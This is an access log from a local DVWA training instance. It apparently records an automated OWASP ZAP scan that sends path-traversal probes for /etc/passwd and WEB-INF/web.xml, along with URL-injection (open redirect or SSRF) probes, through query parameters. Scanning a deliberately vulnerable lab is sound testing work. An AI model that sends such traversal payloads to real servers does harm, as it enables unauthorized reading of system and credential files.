172.17.0.1 - - [12/Feb/2019:08:55:13 +0000] "GET /setup.php HTTP/1.1" 200 4447 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:13 +0000] "POST /setup.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:13 +0000] "GET /sitemap.xml?query=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1" 404 447 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:13 +0000] "GET /sitemap.xml?query=c%3A%2F HTTP/1.1" 404 447 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:13 +0000] "GET /setup.php HTTP/1.1" 200 4428 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:13 +0000] "POST /setup.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:13 +0000] "GET /sitemap.xml?query=%2F HTTP/1.1" 404 447 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:13 +0000] "GET /sitemap.xml?query=c%3A%5C HTTP/1.1" 404 447 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:13 +0000] "GET /setup.php HTTP/1.1" 200 4428 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:13 +0000] "GET /sitemap.xml?query=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F HTTP/1.1" 404 447 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:13 +0000] "POST /setup.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:13 +0000] "GET /sitemap.xml?query=WEB-INF%2Fweb.xml HTTP/1.1" 404 447 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:13 +0000] "GET /setup.php HTTP/1.1" 200 4428 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:13 +0000] "GET /sitemap.xml?query=WEB-INF%5Cweb.xml HTTP/1.1" 404 447 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:13 +0000] "POST /setup.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:13 +0000] "GET /setup.php HTTP/1.1" 200 4428 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:13 +0000] "GET /sitemap.xml?query=%2FWEB-INF%2Fweb.xml HTTP/1.1" 404 447 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:13 +0000] "POST /setup.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:13 +0000] "GET /sitemap.xml?query=%5CWEB-INF%5Cweb.xml HTTP/1.1" 404 447 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:13 +0000] "GET /sitemap.xml?query=thishouldnotexistandhopefullyitwillnot HTTP/1.1" 404 447 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:13 +0000] "GET /setup.php HTTP/1.1" 200 4428 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:13 +0000] "GET /sitemap.xml?query=sitemap.xml HTTP/1.1" 404 447 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:13 +0000] "POST /setup.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:13 +0000] "GET /setup.php HTTP/1.1" 200 4428 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:13 +0000] "GET /sitemap.xml?query=%2Fsitemap.xml HTTP/1.1" 404 447 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:13 +0000] "POST /setup.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:13 +0000] "GET /sitemap.xml?query=%5Csitemap.xml HTTP/1.1" 404 447 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:13 +0000] "GET /setup.php HTTP/1.1" 200 4428 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:13 +0000] "POST /setup.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:13 +0000] "GET /setup.php HTTP/1.1" 200 4428 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:13 +0000] "POST /setup.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:13 +0000] "GET /setup.php HTTP/1.1" 200 4428 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:13 +0000] "POST /setup.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:13 +0000] "GET /setup.php HTTP/1.1" 200 4428 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:13 +0000] "POST /setup.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:13 +0000] "GET /setup.php HTTP/1.1" 200 4428 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:13 +0000] "POST /setup.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:13 +0000] "GET /setup.php HTTP/1.1" 200 4428 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:13 +0000] "GET /?query=http%3A%2F%2Fwww.google.com%2F HTTP/1.1" 302 281 "http://127.0.0.1:8080/robots.txt" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:13 +0000] "GET /docs HTTP/1.1" 301 520 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:13 +0000] "GET /about.php?query=http%3A%2F%2Fwww.google.com%2F HTTP/1.1" 200 5112 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:13 +0000] "GET /login.php HTTP/1.1" 200 1795 "http://127.0.0.1:8080/robots.txt" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:13 +0000] "GET /about.php?query=http%3A%2F%2Fwww.google.com%3A80%2F HTTP/1.1" 200 5112 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:13 +0000] "GET /?query=http%3A%2F%2Fwww.google.com%3A80%2F HTTP/1.1" 302 281 "http://127.0.0.1:8080/robots.txt" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:13 +0000] "GET /login.php HTTP/1.1" 200 1795 "http://127.0.0.1:8080/robots.txt" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:13 +0000] "GET /about.php?query=http%3A%2F%2Fwww.google.com HTTP/1.1" 200 5112 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:13 +0000] "GET /?query=http%3A%2F%2Fwww.google.com HTTP/1.1" 302 281 "http://127.0.0.1:8080/robots.txt" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:13 +0000] "GET /about.php?query=http%3A%2F%2Fwww.google.com%2Fsearch%3Fq%3DOWASP%2520ZAP HTTP/1.1" 200 5112 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:13 +0000] "GET /login.php HTTP/1.1" 200 1795 "http://127.0.0.1:8080/robots.txt" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:13 +0000] "GET /about.php?query=http%3A%2F%2Fwww.google.com%3A80%2Fsearch%3Fq%3DOWASP%2520ZAP HTTP/1.1" 200 5112 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:13 +0000] "GET /?query=http%3A%2F%2Fwww.google.com%2Fsearch%3Fq%3DOWASP%2520ZAP HTTP/1.1" 302 281 "http://127.0.0.1:8080/robots.txt" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:13 +0000] "GET /about.php?query=www.google.com%2F HTTP/1.1" 200 5112 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:13 +0000] "GET /login.php HTTP/1.1" 200 1795 "http://127.0.0.1:8080/robots.txt" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:13 +0000] "GET /about.php?query=www.google.com%3A80%2F HTTP/1.1" 200 5112 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:13 +0000] "GET /?query=http%3A%2F%2Fwww.google.com%3A80%2Fsearch%3Fq%3DOWASP%2520ZAP HTTP/1.1" 302 281 "http://127.0.0.1:8080/robots.txt" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:13 +0000] "GET /about.php?query=www.google.com HTTP/1.1" 200 5112 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:13 +0000] "GET /login.php HTTP/1.1" 200 1795 "http://127.0.0.1:8080/robots.txt" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:13 +0000] "GET /?query=www.google.com%2F HTTP/1.1" 302 281 "http://127.0.0.1:8080/robots.txt" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:13 +0000] "GET /about.php?query=www.google.com%2Fsearch%3Fq%3DOWASP%2520ZAP HTTP/1.1" 200 5112 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:13 +0000] "GET /login.php HTTP/1.1" 200 1795 "http://127.0.0.1:8080/robots.txt" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:13 +0000] "GET /?query=www.google.com%3A80%2F HTTP/1.1" 302 281 "http://127.0.0.1:8080/robots.txt" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:13 +0000] "GET /about.php?query=www.google.com%3A80%2Fsearch%3Fq%3DOWASP%2520ZAP HTTP/1.1" 200 5112 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:13 +0000] "GET /login.php HTTP/1.1" 200 1795 "http://127.0.0.1:8080/robots.txt" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:13 +0000] "GET /?query=www.google.com HTTP/1.1" 302 281 "http://127.0.0.1:8080/robots.txt" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:13 +0000] "GET /login.php HTTP/1.1" 200 1795 "http://127.0.0.1:8080/robots.txt" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:13 +0000] "GET /?query=www.google.com%2Fsearch%3Fq%3DOWASP%2520ZAP HTTP/1.1" 302 281 "http://127.0.0.1:8080/robots.txt" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:13 +0000] "GET /login.php HTTP/1.1" 200 1795 "http://127.0.0.1:8080/robots.txt" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:13 +0000] "GET /?query=www.google.com%3A80%2Fsearch%3Fq%3DOWASP%2520ZAP HTTP/1.1" 302 281 "http://127.0.0.1:8080/robots.txt" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:13 +0000] "GET /login.php HTTP/1.1" 200 1795 "http://127.0.0.1:8080/robots.txt" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:13 +0000] "GET /docs?query=http%3A%2F%2Fwww.google.com%2F HTTP/1.1" 301 594 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:13 +0000] "GET /dvwa HTTP/1.1" 301 520 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:13 +0000] "GET /docs/DVWA_v1.3.pdf?query=http%3A%2F%2Fwww.google.com%2F HTTP/1.1" 200 422251 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:13 +0000] "GET /docs/?query=http%3A%2F%2Fwww.google.com%2F HTTP/1.1" 200 1308 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:13 +0000] "GET /docs?query=http%3A%2F%2Fwww.google.com%3A80%2F HTTP/1.1" 301 604 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:13 +0000] "GET /docs/?query=http%3A%2F%2Fwww.google.com%3A80%2F HTTP/1.1" 200 1308 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:13 +0000] "GET /docs?query=http%3A%2F%2Fwww.google.com HTTP/1.1" 301 588 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:13 +0000] "GET /docs/?query=http%3A%2F%2Fwww.google.com HTTP/1.1" 200 1308 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:13 +0000] "GET /docs?query=http%3A%2F%2Fwww.google.com%2Fsearch%3Fq%3DOWASP%2520ZAP HTTP/1.1" 301 646 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:13 +0000] "GET /docs/?query=http%3A%2F%2Fwww.google.com%2Fsearch%3Fq%3DOWASP%2520ZAP HTTP/1.1" 200 1308 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:13 +0000] "GET /docs?query=http%3A%2F%2Fwww.google.com%3A80%2Fsearch%3Fq%3DOWASP%2520ZAP HTTP/1.1" 301 656 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:13 +0000] "GET /docs/?query=http%3A%2F%2Fwww.google.com%3A80%2Fsearch%3Fq%3DOWASP%2520ZAP HTTP/1.1" 200 1308 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:13 +0000] "GET /docs?query=www.google.com%2F HTTP/1.1" 301 568 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:13 +0000] "GET /docs/?query=www.google.com%2F HTTP/1.1" 200 1327 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:13 +0000] "GET /docs?query=www.google.com%3A80%2F HTTP/1.1" 301 578 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:13 +0000] "GET /docs/?query=www.google.com%3A80%2F HTTP/1.1" 200 1308 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:13 +0000] "GET /docs?query=www.google.com HTTP/1.1" 301 562 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:13 +0000] "GET /docs/?query=www.google.com HTTP/1.1" 200 1308 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:13 +0000] "GET /docs?query=www.google.com%2Fsearch%3Fq%3DOWASP%2520ZAP HTTP/1.1" 301 620 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:13 +0000] "GET /docs/?query=www.google.com%2Fsearch%3Fq%3DOWASP%2520ZAP HTTP/1.1" 200 1308 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:13 +0000] "GET /docs?query=www.google.com%3A80%2Fsearch%3Fq%3DOWASP%2520ZAP HTTP/1.1" 301 630 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:13 +0000] "GET /docs/?query=www.google.com%3A80%2Fsearch%3Fq%3DOWASP%2520ZAP HTTP/1.1" 200 1308 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:13 +0000] "GET /docs/DVWA_v1.3.pdf?query=http%3A%2F%2Fwww.google.com%3A80%2F HTTP/1.1" 200 422251 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:13 +0000] "GET /docs/DVWA_v1.3.pdf?query=http%3A%2F%2Fwww.google.com HTTP/1.1" 200 422251 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:13 +0000] "GET /docs/DVWA_v1.3.pdf?query=http%3A%2F%2Fwww.google.com%2Fsearch%3Fq%3DOWASP%2520ZAP HTTP/1.1" 200 422251 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:13 +0000] "GET /dvwa?query=http%3A%2F%2Fwww.google.com%2F HTTP/1.1" 301 594 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:13 +0000] "GET /dvwa/?query=http%3A%2F%2Fwww.google.com%2F HTTP/1.1" 200 1674 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:13 +0000] "GET /dvwa/css HTTP/1.1" 301 528 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:13 +0000] "GET /dvwa?query=http%3A%2F%2Fwww.google.com%3A80%2F HTTP/1.1" 301 604 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:13 +0000] "GET /dvwa/?query=http%3A%2F%2Fwww.google.com%3A80%2F HTTP/1.1" 200 1674 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:13 +0000] "GET /dvwa?query=http%3A%2F%2Fwww.google.com HTTP/1.1" 301 588 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:13 +0000] "GET /dvwa/?query=http%3A%2F%2Fwww.google.com HTTP/1.1" 200 1674 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:13 +0000] "GET /dvwa?query=http%3A%2F%2Fwww.google.com%2Fsearch%3Fq%3DOWASP%2520ZAP HTTP/1.1" 301 646 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:13 +0000] "GET /dvwa/?query=http%3A%2F%2Fwww.google.com%2Fsearch%3Fq%3DOWASP%2520ZAP HTTP/1.1" 200 1674 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:13 +0000] "GET /dvwa?query=http%3A%2F%2Fwww.google.com%3A80%2Fsearch%3Fq%3DOWASP%2520ZAP HTTP/1.1" 301 656 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:13 +0000] "GET /dvwa/?query=http%3A%2F%2Fwww.google.com%3A80%2Fsearch%3Fq%3DOWASP%2520ZAP HTTP/1.1" 200 1674 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:13 +0000] "GET /dvwa?query=www.google.com%2F HTTP/1.1" 301 568 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:13 +0000] "GET /dvwa/?query=www.google.com%2F HTTP/1.1" 200 1674 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
